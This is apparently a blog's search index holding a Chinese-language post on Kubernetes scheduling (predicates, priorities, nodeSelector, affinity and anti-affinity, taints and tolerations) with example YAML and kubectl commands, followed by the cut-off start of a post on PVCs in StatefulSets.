<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>kubernetes 集群调度</title>
      <link href="/2021/11/16/Kubernets%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6/"/>
      <url>/2021/11/16/Kubernets%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="1-调度过程"><a href="#1-调度过程" class="headerlink" title="1.调度过程"></a>1.调度过程<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--  调度分为几个部分</span><br><span class="hljs-comment">1，首先是过滤掉不满足条件的节点，这个过程成为 predicate;</span><br><span class="hljs-comment">2，然后通过的节点按照优先级排序，这个是priority;</span><br><span class="hljs-comment">3， 最后从中选择优先级最高的节点。 如果中间任何一步骤有错误，就直接返回错误。</span><br><span class="hljs-comment"> --&gt;</span><br></code></pre></td></tr></table></figure><h3 id="1-1-调度中的过滤-predicate-预选"><a href="#1-1-调度中的过滤-predicate-预选" class="headerlink" title="1.1 调度中的过滤 predicate :预选"></a>1.1 调度中的过滤 predicate :预选</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html">预选有一系列的算法可以使用：<br><br>PodFitsResources ：节点上剩余的资源是否大于 pod 请求的资源<br><br>PodFitsHost ：如果 pod 指定了 NodeName，检查节点名称是否和 NodeName 匹配<br><br>PodFitsHostPorts ：节点上已经使用的 port 是否和 pod 申请的 port 冲突<br><br>PodSelectorMatches ：过滤掉和 pod 指定的 label 不匹配的节点<br><br>NoDiskConflict ：已经 mount 的 volume 和 pod 指定的 volume 不冲突，除非它们都是只读<br><span class="hljs-comment">&lt;!--如果在预选过程中没有合适的节点，pod 会一直在 pending 状态，不断重试调度，直到有节点满足条件。经过这个步骤，如果有多个</span><br><span class="hljs-comment">节点满足条件，就继续优选过程，按照优先级大小对节点排序，优先级由一系列键值对组成，键是该优先级项的名称，值是它的权重（该项</span><br><span class="hljs-comment">的重要性）。这些优先级选项包括：--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="1-2-调度优选-priority"><a href="#1-2-调度优选-priority" class="headerlink" title="1.2 调度优选 priority"></a>1.2 调度优选 priority</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html">LeastRequestedPriority ：通过计算 CPU 和 Memory 的使用率来决定权重，使用率越低权重越高。换句话说，这个优先级指标倾向于资源使用比例更低的节点。<br><br>BalancedResourceAllocation ：节点上 CPU 和 Memory 使用率越接近，权重越高。这个应该和上面的一起使用，不应该单独使用。<br><br>ImageLocalityPriority ：倾向于已经有要使用镜像的节点，镜像总大小值越大，权重越高<br><br>通过算法对所有的优先级项目和权重进行计算，得出最终的结果。<br><br></code></pre></td></tr></table></figure><h1 id="2-将Pod-分配给节点"><a href="#2-将Pod-分配给节点" class="headerlink" title="2.将Pod 分配给节点"></a>2.将Pod 分配给节点</h1><h3 id="2-1-nodeSelector"><a href="#2-1-nodeSelector" class="headerlink" title="2.1 nodeSelector"></a>2.1 nodeSelector</h3><h4 id="2-1-1-给node添加lables"><a href="#2-1-1-给node添加lables" class="headerlink" title="2.1.1 给node添加lables"></a>2.1.1 给node添加lables</h4><p>例如，如果你的节点名称为 ‘kubernetes-foo-node-1.c.a-robinson.internal’ 并且想要的标签是 ‘disktype=ssd’，则可以执行 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl label nodes kubernetes-foo-node-1.c.a-robinson.internal disktype=ssd 命令。<br></code></pre></td></tr></table></figure><h4 id="2-1-2-添加-nodeSelector-字段到-Pod-配置中"><a href="#2-1-2-添加-nodeSelector-字段到-Pod-配置中" class="headerlink" title="2.1.2 添加 nodeSelector 字段到 Pod 配置中"></a>2.1.2 添加 nodeSelector 字段到 Pod 配置中</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">env:</span> <span class="hljs-string">test</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">imagePullPolicy:</span> <span class="hljs-string">IfNotPresent</span><br>  <span class="hljs-attr">nodeSelector:</span><br>    <span class="hljs-attr">disktype:</span> <span class="hljs-string">ssd</span><br></code></pre></td></tr></table></figure><p><a href="/Kubernets%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6/20211116020708846.png" class="gallery-item"><img src="/2021/11/16/Kubernets%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6/20211116020708846.png"></a></p><h1 id="3-亲和度与反亲和度-【节点和POD两个维度】"><a href="#3-亲和度与反亲和度-【节点和POD两个维度】" class="headerlink" title="3. 亲和度与反亲和度 【节点和POD两个维度】"></a>3. 亲和度与反亲和度 【节点和POD两个维度】</h1><h3 id="3-1-节点亲和度"><a href="#3-1-节点亲和度" class="headerlink" title="3.1 节点亲和度"></a>3.1 节点亲和度</h3><h4 id="3-1-1-节点亲和性类型。"><a href="#3-1-1-节点亲和性类型。" class="headerlink" title="3.1.1 节点亲和性类型。"></a>3.1.1 节点亲和性类型。</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">requiredDuringSchedulingIgnoredDuringExecution &quot;硬需求&quot;  <br><span class="hljs-comment">&lt;!--定了将 Pod 调度到一个节点上 必须满足的规则（就像 nodeSelector 但使用更具表现力的语法）--&gt;</span><br>preferredDuringSchedulingIgnoredDuringExecution。“软需求”<br><span class="hljs-comment">&lt;!--指定调度器将尝试执行但不能保证的偏好。--&gt;</span><br>“IgnoredDuringExecution”<br><span class="hljs-comment">&lt;!--类似于 nodeSelector 的工作原理， 如果节点的标签在运行时发生变更，从而不再满足 Pod 上的亲和性规则，那么 Pod 将仍然继续在该节点上运行。--&gt;</span><br><br>requiredDuringSchedulingRequiredDuringExecution <br>requiredDuringSchedulingIgnoredDuringExecution  <br><span class="hljs-comment">&lt;!--两者区别，前者将Pod从不再满足Pod的节点亲和性要求的节点上驱逐。 --&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-1-2-节点亲和度设置"><a href="#3-1-2-节点亲和度设置" class="headerlink" title="3.1.2 节点亲和度设置"></a>3.1.2 节点亲和度设置</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">with-node-affinity</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">affinity:</span><br>    <span class="hljs-attr">nodeAffinity:</span><br>      <span class="hljs-attr">requiredDuringSchedulingIgnoredDuringExecution:</span><br>        <span class="hljs-attr">nodeSelectorTerms:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">matchExpressions:</span><br>          <span class="hljs-comment"># 仅将 Pod 运行在具有 Intel CPU 的节点上</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">kubernetes.io/e2e-az-name</span><br>            <span class="hljs-comment"># 你可以在上面的例子中看到 In 操作符的使用。新的节点亲和性语法支持下面的操作符： In，NotIn，Exists，</span><br>           <span class="hljs-comment"># DoesNotExist，Gt，Lt。 你可以使用 NotIn 和 DoesNotExist 来实现节点反亲和性行为，或者使用 节点污点</span><br>           <span class="hljs-comment">#将 Pod 从特定节点中驱逐。</span><br>            <span class="hljs-attr">operator:</span> <span class="hljs-string">In</span><br>            <span class="hljs-attr">values:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">e2e-az1</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">e2e-az2</span><br>      <span class="hljs-attr">preferredDuringSchedulingIgnoredDuringExecution:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">weight:</span> <span class="hljs-number">1</span><br>        <span class="hljs-attr">preference:</span><br>          <span class="hljs-attr">matchExpressions:</span><br>          <span class="hljs-comment"># 具有标签键为 another-node-label-key 且标签值为 another-node-label-value 的节点应该优先使用。</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">another-node-label-key</span><br>            <span class="hljs-attr">operator:</span> <span class="hljs-string">In</span><br>            <span class="hljs-attr">values:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">another-node-label-value</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">with-node-affinity</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">k8s.gcr.io/pause:2.0</span><br><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 测试的yaml 文件</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">with-node-affinity</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">affinity:</span><br>    <span class="hljs-attr">nodeAffinity:</span><br>    <span class="hljs-comment"># 改成 requiredDuringSchedulingRequiredDuringExecution 无法识别。</span><br>      <span class="hljs-attr">requiredDuringSchedulingIgnoredDuringExecution:</span><br>        <span class="hljs-attr">nodeSelectorTerms:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">matchExpressions:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">kubernetes.io/arch</span><br>          <span class="hljs-comment"># NotIn    DoesNotExist  仅是操作，podAntiAffinity 表示反亲和度规则， podAffinity 亲和度规则</span><br>            <span class="hljs-attr">operator:</span> <span class="hljs-string">NotIn</span><br>            <span class="hljs-attr">values:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">amd64</span><br>      <span class="hljs-attr">preferredDuringSchedulingIgnoredDuringExecution:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">weight:</span> <span class="hljs-number">1</span><br>        <span class="hljs-attr">preference:</span><br>          <span class="hljs-attr">matchExpressions:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">another-node-label-key</span><br>            <span class="hljs-attr">operator:</span> <span class="hljs-string">In</span><br>            <span class="hljs-attr">values:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">another-node-label-value</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">with-node-affinity</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">tomcat</span><br><br></code></pre></td></tr></table></figure><p><a href="/Kubernets%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6/20211116034341775.png" class="gallery-item"><img src="/2021/11/16/Kubernets%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6/20211116034341775.png"></a></p><p><a href="/Kubernets%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6/20211116034417271.png" class="gallery-item"><img src="/2021/11/16/Kubernets%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6/20211116034417271.png"></a></p><h3 id="3-2-pod-间亲和性与反亲和性"><a href="#3-2-pod-间亲和性与反亲和性" class="headerlink" title="3.2 pod 间亲和性与反亲和性"></a>3.2 pod 间亲和性与反亲和性</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">with-pod-affinity</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-comment"># 亲和度</span><br>  <span class="hljs-attr">affinity:</span><br>    <span class="hljs-attr">podAffinity:</span><br>      <span class="hljs-attr">requiredDuringSchedulingIgnoredDuringExecution:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">labelSelector:</span><br>          <span class="hljs-attr">matchExpressions:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">security</span><br>            <span class="hljs-attr">operator:</span> <span class="hljs-string">In</span><br>            <span class="hljs-attr">values:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">S1</span><br>        <span class="hljs-comment"># 除了你添加的标签外，节点还预制了一组标准标签。 参见这些常用的标签，注解以及污点：topology.kubernetes.io/zone</span><br>        <span class="hljs-comment"># 这些标签的值是特定于云供应商的，因此不能保证可靠</span><br>        <span class="hljs-attr">topologyKey:</span> <span class="hljs-string">topology.kubernetes.io/zone</span><br>   <span class="hljs-comment"># 反亲和度</span><br>    <span class="hljs-attr">podAntiAffinity:</span><br>      <span class="hljs-attr">preferredDuringSchedulingIgnoredDuringExecution:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">weight:</span> <span class="hljs-number">100</span><br>        <span class="hljs-attr">podAffinityTerm:</span><br>          <span class="hljs-attr">labelSelector:</span><br>            <span class="hljs-attr">matchExpressions:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">security</span><br>              <span class="hljs-attr">operator:</span> <span class="hljs-string">In</span><br>              <span class="hljs-attr">values:</span><br>              <span class="hljs-bullet">-</span> <span class="hljs-string">S2</span><br>          <span class="hljs-attr">topologyKey:</span> <span class="hljs-string">topology.kubernetes.io/zone</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">with-pod-affinity</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">pause:2.0</span><br><br><br></code></pre></td></tr></table></figure><p><a href="/Kubernets%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6/20211116051920937.png" class="gallery-item"><img src="/2021/11/16/Kubernets%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6/20211116051920937.png"></a></p><h3 id="3-3-更实际的用例"><a href="#3-3-更实际的用例" class="headerlink" title="3.3 更实际的用例"></a>3.3 更实际的用例</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">redis-cache</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">store</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">store</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">affinity:</span><br>        <span class="hljs-attr">podAntiAffinity:</span><br>          <span class="hljs-attr">requiredDuringSchedulingIgnoredDuringExecution:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">labelSelector:</span><br>              <span class="hljs-attr">matchExpressions:</span><br>              <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">app</span><br>                <span class="hljs-attr">operator:</span> <span class="hljs-string">In</span><br>                <span class="hljs-attr">values:</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-string">store</span><br>            <span class="hljs-attr">topologyKey:</span> <span class="hljs-string">&quot;kubernetes.io/hostname&quot;</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">redis-server</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">redis:3.2-alpine</span><br><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">web-server</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">web-store</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">web-store</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">affinity:</span><br>        <span class="hljs-attr">podAntiAffinity:</span><br>          <span class="hljs-attr">requiredDuringSchedulingIgnoredDuringExecution:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">labelSelector:</span><br>              <span class="hljs-attr">matchExpressions:</span><br>              <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">app</span><br>                <span class="hljs-attr">operator:</span> <span class="hljs-string">In</span><br>                <span class="hljs-attr">values:</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-string">web-store</span><br>                <span class="hljs-comment">#上面的例子使用 PodAntiAffinity 规则和 topologyKey: &quot;kubernetes.io/hostname&quot; 来部署 redis 集群以便</span><br>                <span class="hljs-comment"># 在同一主机上没有两个实例。</span><br>            <span class="hljs-attr">topologyKey:</span> <span class="hljs-string">&quot;kubernetes.io/hostname&quot;</span><br>        <span class="hljs-attr">podAffinity:</span><br>          <span class="hljs-attr">requiredDuringSchedulingIgnoredDuringExecution:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">labelSelector:</span><br>              <span class="hljs-attr">matchExpressions:</span><br>              <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">app</span><br>                <span class="hljs-attr">operator:</span> <span class="hljs-string">In</span><br>                <span class="hljs-attr">values:</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-string">store</span><br>            <span class="hljs-attr">topologyKey:</span> <span class="hljs-string">&quot;kubernetes.io/hostname&quot;</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">web-app</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:1.16-alpine</span><br><br></code></pre></td></tr></table></figure><p><a href="/Kubernets%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6/20211116053100905.png" class="gallery-item"><img src="/2021/11/16/Kubernets%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6/20211116053100905.png"></a></p><h1 id="4-节点污点化-和容忍度"><a href="#4-节点污点化-和容忍度" class="headerlink" title="4.节点污点化 和容忍度"></a>4.节点污点化 和容忍度</h1><h3 id="4-1-概念"><a href="#4-1-概念" class="headerlink" title="4.1 概念"></a>4.1 概念</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--性 是 Pod 的一种属性，它使 Pod 被吸引到一类特定的节点 （这可能出于一种偏好，也可能是硬性要求）。 污点（Taint）则相反</span><br><span class="hljs-comment">——它使节点能够排斥一类特定的 Pod。容忍度（Toleration）是应用于 Pod 上的，允许（但并不要求）Pod 调度到带有与之匹配的污点</span><br><span class="hljs-comment">的节点上。</span><br><span class="hljs-comment">污点和容忍度（Toleration）相互配合，可以用来避免 Pod 被分配到不合适的节点上。 每个节点上都可以应用一个或多个污点，这表示</span><br><span class="hljs-comment">对于那些不能容忍这些污点的 Pod，是不会被该节点接受的</span><br><span class="hljs-comment">如果节点有多个污点，那么必须全部容忍所有Toleration 污点，才能够被分配到该Node 上--&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="4-2-给node-添加一个污点。"><a href="#4-2-给node-添加一个污点。" class="headerlink" title="4.2 给node 添加一个污点。"></a>4.2 给node 添加一个污点。</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl taint nodes node1 key1=value1:NoSchedule<br><span class="hljs-meta">#</span><span class="bash"> 给节点 node1 增加一个污点，它的键名是 key1，键值是 value1，效果是 NoSchedule。 这表示只有拥有和这个污点相匹配的容忍度</span><br><span class="hljs-meta">#</span><span class="bash"> Pod 才能够被分配到 node1 这个节点。</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 移除</span><br>kubectl taint nodes node1 key1=value1:NoSchedule-<br><br></code></pre></td></tr></table></figure><h4 id="4-3-基于节点状态添加污点"><a href="#4-3-基于节点状态添加污点" class="headerlink" title="4.3 基于节点状态添加污点"></a>4.3 基于节点状态添加污点</h4><p>控制平面使用节点控制器自动创建 与节点状况对应的带有 NoSchedule 效应的污点。</p><p>调度器在进行调度时检查污点，而不是检查节点状况。这确保节点状况不会直接影响调度。<br><font color="green" size="2">例如，如果 DiskPressure 节点状况处于活跃状态，则控制平面 添加 node.kubernetes.io/disk-pressure 污点并且不会调度新的 pod 到受影响的节点。如果 MemoryPressure 节点状况处于活跃状态，则 控制平面添加 node.kubernetes.io/memory-pressure 污点。</font></p><p>对于新创建的 Pod，可以通过添加相应的 Pod 容忍度来忽略节点状况。 控制平面还在具有除 BestEffort 之外的 QoS 类的 pod 上 添加 node.kubernetes.io/memory-pressure 容忍度。 这是因为 Kubernetes 将 Guaranteed 或 Burstable QoS 类中的 Pod（甚至没有设置内存请求的 Pod） 视为能够应对内存压力，而新创建的 BestEffort Pod 不会被调度到受影响的节点上。</p><p>DaemonSet 控制器自动为所有守护进程添加如下 NoSchedule 容忍度以防 DaemonSet 崩溃：</p><p>node.kubernetes.io/memory-pressure<br>node.kubernetes.io/disk-pressure<br>node.kubernetes.io/pid-pressure (1.14 或更高版本)<br>node.kubernetes.io/unschedulable (1.10 或更高版本)<br>node.kubernetes.io/network-unavailable (只适合主机网络配置)<br>添加上述容忍度确保了向后兼容，您也可以选择自由向 DaemonSet 添加容忍度</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PVC in StatefulSet</title>
      <link href="/2021/11/15/PVC%20in%20StatefulSet/"/>
      <url>/2021/11/15/PVC%20in%20StatefulSet/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="1-StatefulSet-概念及特性"><a href="#1-StatefulSet-概念及特性" class="headerlink" title="1.StatefulSet 概念及特性"></a>1.StatefulSet 概念及特性<h3 id="1-1-创建StatefulSet"><a href="#1-1-创建StatefulSet" class="headerlink" title="1.1 创建StatefulSet"></a>1.1 创建StatefulSet</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 它创建了一个 Headless Service nginx 用来发布 StatefulSet web 中的 Pod 的 IP 地址。--&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 